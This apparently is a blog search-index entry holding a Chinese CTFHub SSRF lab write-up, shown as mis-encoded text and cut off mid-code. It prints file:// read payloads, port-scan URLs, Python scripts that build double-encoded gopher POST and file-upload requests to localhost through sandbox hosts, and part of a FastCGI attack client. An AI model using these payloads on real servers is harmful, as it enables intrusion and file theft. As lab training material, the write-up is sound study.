<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFHub-SSRFå­¦ä¹ </title>
      <link href="posts/ad205f1c/"/>
      <url>posts/ad205f1c/</url>
      
        <content type="html"><![CDATA[<p>ä¸»è¦å­¦ä¹ ä¸€ä¸‹å†…ç½‘ä¸­å„ç§å¸¸ç”¨çš„åè®®ï¼Œä¸€æ­¥æ­¥æ¥</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>SSRFæ¼æ´çš„ä¸»è¦æˆå› ä¸»è¦æ˜¯å› ä¸ºWebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·æä¾›çš„URLå’Œè¿œç«¯æœåŠ¡å™¨è¿”å›çš„ä¿¡æ¯æ²¡æœ‰è¿›è¡Œåˆé€‚çš„éªŒè¯å’Œè¿‡æ»¤</p><p>æ”»å‡»è€…åˆ©ç”¨SSRFå¯ä»¥å®ç°çš„æ”»å‡»å¦‚ä¸‹ï¼š</p><ol><li>å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯;</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº(æ¯”å¦‚æº¢å‡º);</li><li>å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°;</li><li>æ”»å‡»å†…å¤–ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨getå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(æ¯”å¦‚struts2ï¼Œsqliç­‰);</li><li>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ã€‚</li></ol><p>CTFHubä¸Šçš„é¢˜</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707142325348.png" alt loading="lazy"></p><h3 id="å†…ç½‘è®¿é—®"><a href="#å†…ç½‘è®¿é—®" class="headerlink" title="å†…ç½‘è®¿é—®"></a>å†…ç½‘è®¿é—®</h3><p>é¢˜ç›®æç¤º<code>å°è¯•è®¿é—®ä½äº127.0.0.1çš„flag.phpå§</code></p><p>httpåè®®ç›´æ¥è¯»äº†</p><pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707142536551.png" alt loading="lazy"></p><h3 id="ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>ä¼ªåè®®è¯»å–æ–‡ä»¶</h3><p>é¢˜ç›®æç¤º<code>å°è¯•å»è¯»å–ä¸€ä¸‹Webç›®å½•ä¸‹çš„flag.phpå§</code></p><p>fileåè®®è¯»å–æ–‡ä»¶ï¼Œéœ€è¦ç»å¯¹è·¯å¾„</p><pre class="language-none"><code class="language-none">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707144256095.png" alt loading="lazy"></p><p>æˆ‘ä»¬å¯ä»¥å†è¯»ä¸€ä¸‹index.phpçœ‹çœ‹æ¼æ´ä»£ç ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯PHP <code>cURL</code> å‡½æ•°æ¥è¿›è¡Œæ•°æ®çš„è·å–ï¼Œå…·ä½“å¯å‚è€ƒ -&gt; <a href="https://www.runoob.com/php/php-ref-curl.html">PHP cURL å‡½æ•°</a></p><p>æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®</p><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>é¢˜ç›®æç¤º<code>æ¥æ¥æ¥æ€§æ„ŸCTFHubåœ¨çº¿æ‰«ç«¯å£,æ®è¯´ç«¯å£èŒƒå›´æ˜¯8000-9000å“¦</code></p><p>httpè¯·æ±‚ï¼Œæ”¾åˆ°bpé‡Œè·‘ä¸€ä¸‹ç«¯å£å³å¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å…ˆç”¨dictåè®®æ¥è¿›è¡Œç«¯å£æ¢æµ‹ï¼Œç„¶åå†ä½¿ç”¨httpæ¥è®¿é—®å†…å®¹</p><pre class="language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8704</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707151631243.png" alt loading="lazy"></p><h3 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h3><p>é¢˜ç›®æç¤º<code>è¿™æ¬¡æ˜¯å‘ä¸€ä¸ªHTTP POSTè¯·æ±‚.å¯¹äº†.ssrfæ˜¯ç”¨phpçš„curlå®ç°çš„.å¹¶ä¸”ä¼šè·Ÿè¸ª302è·³è½¬.åŠ æ²¹å§éªšå¹´</code></p><p>æ‰«æç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707155826050.png" alt loading="lazy"></p><p>è®¿é—®flag.phpæç¤º<code>Just View From 127.0.0.1</code></p><p>åˆ©ç”¨SSRFè¯·æ±‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707160354027.png" alt loading="lazy"></p><p>å¦å¤–ç”¨fileå¯ä»¥è¯»åˆ°æºç </p><p>flag.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- Debug: key=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°éœ€è¦POSTä¸€ä¸ªkeyï¼Œå¹¶ä¸”keyè¦ç­‰äºmd5(flag)ï¼Œæ‰å¯ä»¥æ‹¿åˆ°flagï¼Œå¹¶ä¸”éœ€è¦<code>$_SERVER[&quot;REMOTE_ADDR&quot;] == &quot;127.0.0.1&quot;</code> </p><p>keyå‰é¢æ˜¯æ‹¿åˆ°äº†çš„ï¼Œä¸º<code>bacd40b119dfa24fa24640331508799f</code></p><p>äºæ˜¯åˆ©ç”¨<code>gopher</code>åè®®å‘åŒ…</p><p>æ•°æ®åŒ…ä¸º</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Host:</span> 127.0.0.1<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 36key=bacd40b119dfa24fa24640331508799f</code></pre><p>ç”¨pythonè¯·æ±‚ï¼Œexpå¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge-27a1758eb0df6f71.sandbox.ctfhub.com:10800/?url="</span>payload <span class="token operator">=</span>\<span class="token triple-quoted-string string">"""POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36key=bacd40b119dfa24fa24640331508799f"""</span><span class="token comment">#æ³¨æ„åé¢ä¸€å®šè¦æœ‰å›è½¦ï¼Œå›è½¦ç»“å°¾è¡¨ç¤ºhttpè¯·æ±‚ç»“æŸ</span>tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>newresult <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>       <span class="token comment"># è¿™é‡Œå› ä¸ºæ˜¯GETè¯·æ±‚æ‰€ä»¥è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç </span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A80&#x2F;_POST%2520&#x2F;flag.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dbacd40b119dfa24fa24640331508799f%250D%250A</code></pre><p>è¯·æ±‚ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707163338679.png" alt loading="lazy"></p><h3 id="ä¸Šä¼ æ–‡ä»¶"><a href="#ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶"></a>ä¸Šä¼ æ–‡ä»¶</h3><p>é¢˜ç›®æç¤º<code>è¿™æ¬¡éœ€è¦ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åˆ°flag.phpäº†.ç¥ä½ å¥½è¿</code></p><p>httpè¯·æ±‚ä¸€ä¸‹flag.php</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707164424153.png" alt loading="lazy"></p><p>fileè¯»ä¸‹æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>Upload Webshell<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>å†™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>NewFile<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>éšä¾¿ä¼ ä¸ªæ–‡ä»¶æŠŠåŒ…æŠ“ä¸‹æ¥</p><p>æ•°æ®åŒ…ä¸º</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Host:</span> 127.0.0.1<span class="token header-name keyword">Content-Length:</span> 182<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=----WebKitFormBoundaryqFOX61XFhjO2CFJN------WebKitFormBoundaryqFOX61XFhjO2CFJN<span class="token header-name keyword">Content-Disposition:</span> form-data; name="file"; filename="1.png"<span class="token header-name keyword">Content-Type:</span> image/pngabcd------WebKitFormBoundaryqFOX61XFhjO2CFJN--</code></pre><p>è¿˜æ˜¯å’Œä¸Šä¸€ä¸ªä¸€æ ·ï¼Œexpå¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge-db30f38f11747128.sandbox.ctfhub.com:10800/?url="</span>payload <span class="token operator">=</span>\<span class="token triple-quoted-string string">"""POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Length: 182Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqFOX61XFhjO2CFJN------WebKitFormBoundaryqFOX61XFhjO2CFJNContent-Disposition: form-data; name="file"; filename="1.png"Content-Type: image/pngabcd------WebKitFormBoundaryqFOX61XFhjO2CFJN--"""</span>tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>newresult <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A80&#x2F;_POST%2520&#x2F;flag.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520182%250D%250AContent-Type%253A%2520multipart&#x2F;form-data%253B%2520boundary%253D----WebKitFormBoundaryqFOX61XFhjO2CFJN%250D%250A%250D%250A------WebKitFormBoundaryqFOX61XFhjO2CFJN%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.png%2522%250D%250AContent-Type%253A%2520image&#x2F;png%250D%250A%250D%250Aabcd%250D%250A------WebKitFormBoundaryqFOX61XFhjO2CFJN--%250D%250A</code></pre><p>è¯·æ±‚ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707165044259.png" alt loading="lazy"></p><h3 id="FastCGIåè®®"><a href="#FastCGIåè®®" class="headerlink" title="FastCGIåè®®"></a>FastCGIåè®®</h3><p>é¢˜ç›®æç¤º<code>è¿™æ¬¡.æˆ‘ä»¬éœ€è¦æ”»å‡»ä¸€ä¸‹fastcgiåè®®å’¯.ä¹Ÿè®¸é™„ä»¶çš„æ–‡ç« ä¼šå¯¹ä½ æœ‰ç‚¹å¸®åŠ©</code></p><p>ç›´æ¥çœ‹PğŸ®çš„è¿™ä¸ª <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>åˆ©ç”¨æ–¹æ³•å‚è€ƒ <a href="https://bbs.ichunqiu.com/thread-58455-1-1.html">https://bbs.ichunqiu.com/thread-58455-1-1.html</a></p><p>ç†è§£åŸç†åç›´æ¥åˆ©ç”¨ï¼Œåˆ©ç”¨è„šæœ¬åœ°å€ <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>æˆ‘è¿™é‡Œæ”¾è¿™å­˜ä¸€ä¸ª</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> random<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>PY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">bchr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> PY2<span class="token punctuation">:</span>        <span class="token keyword">return</span> force_bytes<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> c    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">issubclass</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">class</span> <span class="token class-name">FastCGIClient</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A Fast-CGI Client for Python"""</span>    <span class="token comment"># private</span>    __FCGI_VERSION <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_RESPONDER <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_AUTHORIZER <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_ROLE_FILTER <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_BEGIN <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_TYPE_ABORT <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_TYPE_END <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_PARAMS <span class="token operator">=</span> <span class="token number">4</span>    __FCGI_TYPE_STDIN <span class="token operator">=</span> <span class="token number">5</span>    __FCGI_TYPE_STDOUT <span class="token operator">=</span> <span class="token number">6</span>    __FCGI_TYPE_STDERR <span class="token operator">=</span> <span class="token number">7</span>    __FCGI_TYPE_DATA <span class="token operator">=</span> <span class="token number">8</span>    __FCGI_TYPE_GETVALUES <span class="token operator">=</span> <span class="token number">9</span>    __FCGI_TYPE_GETVALUES_RESULT <span class="token operator">=</span> <span class="token number">10</span>    __FCGI_TYPE_UNKOWNTYPE <span class="token operator">=</span> <span class="token number">11</span>    __FCGI_HEADER_SIZE 